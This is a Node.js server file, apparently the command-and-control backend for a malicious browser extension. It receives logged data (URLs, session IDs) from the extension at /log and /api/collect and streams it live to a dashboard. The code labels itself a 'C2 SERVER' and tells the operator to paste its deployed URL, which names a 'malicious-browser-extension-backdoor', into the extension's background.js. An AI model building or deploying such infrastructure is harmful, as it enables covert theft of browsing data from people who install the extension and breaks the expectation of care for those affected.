const express = require("express");
const cors = require("cors");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors()); // Important: allows the browser extension to send fetches cross-origin
app.use(express.json()); // Parses the incoming webhook JSON body

// Serve static frontend files (e.g., the dashboard)
app.use(express.static("public"));

// Legacy Webhook endpoint
app.post("/api/collect", (req, res) => {
  console.log(" [C2 SERVER] Legacy /api/collect payload received");
  io.emit("new-log", req.body);
  res.status(200).json({ status: "logged" });
});

// New Log endpoint
app.post("/log", (req, res) => {
  const data = req.body;
  if (!data.url) {
    console.warn("Received malformed payload without URL.", data);
    return res.status(400).json({ status: "error" });
  }
  
  // Immediately emit data to all connected clients
  io.emit("new-log", data);

  console.log(` [C2 SERVER] Broadcasted log from ${data.sessionId} to dashboard`);
  res.status(200).json({ status: "logged" });
});

io.on("connection", (socket) => {
  console.log(`[WebSocket] Dashboard Client connected: ${socket.id}`);
  socket.on("disconnect", () => {
    console.log(`[WebSocket] Dashboard Client disconnected: ${socket.id}`);
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`\n C2 Listener is online and running on port ${PORT}`);
  console.log(`\n Dashboard available at: https://malicious-browser-extension-backdoor.onrender.com/ (when deployed)`);
  console.log(
    `\n Next step: wait for Render deployment to finish if recently pushed.`,
  );
  console.log(` Then, paste the Render URL into background.js (SERVER_URL).\n`);
});
